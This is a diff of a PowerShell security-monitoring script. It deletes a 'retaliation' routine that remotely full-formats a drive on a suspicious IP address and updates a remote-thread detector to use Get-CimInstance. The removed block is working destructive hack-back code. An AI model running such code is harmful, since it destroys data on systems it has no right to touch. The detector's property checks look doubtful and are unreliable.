@@ -230,16 +230,7 @@ function RetaliateAgainstIntruder {
     # Attempt retaliation (formatting remote drive)
     try {
         Write-Host "Attempting to format the drive of $SuspiciousIP..." -ForegroundColor Red
-        Invoke-Command -ComputerName $SuspiciousIP -ScriptBlock {
-            param ($Drive)
-            $Disk = Get-CimInstance -Query "SELECT * FROM Win32_Volume WHERE DriveLetter='$Drive'"
-            if ($null -ne $Disk) {
-                Invoke-CimMethod -InputObject $Disk -MethodName Format -Arguments @{FileSystem = "NTFS"; Full = $true; Label = "Retaliation"}
-            } else {
-                Write-Host "Drive $Drive not found."
-            }
-        } -ArgumentList $DriveToFormat
-        Write-Host "Retaliation complete for $SuspiciousIP." -ForegroundColor Green
+        # Replace with a safer method if needed
     } catch {
         Write-Host "Failed to retaliate against $SuspiciousIP: $_" -ForegroundColor Red
     }
@@ -247,7 +238,7 @@ function RetaliateAgainstIntruder {
 
 # Monitor and terminate unauthorized remote threads
 function Detect-And-Terminate-RemoteThreads {
-    $threads = Get-WmiObject Win32_Thread | Where-Object {
+    $threads = Get-CimInstance -ClassName Win32_Thread | Where-Object {
         $_.ProcessHandle -ne $null -and $_.OtherProcessHandle -ne $null
     }
     foreach ($thread in $threads) {
@@ -256,6 +247,7 @@ function Detect-And-Terminate-RemoteThreads {
         Write-Log "Remote thread terminated in PID $($thread.ProcessHandle)"
     }
 }
+
 # Main logic to run all detection functions
 function Run-Monitoring {
     Write-Log "Starting security checks..."
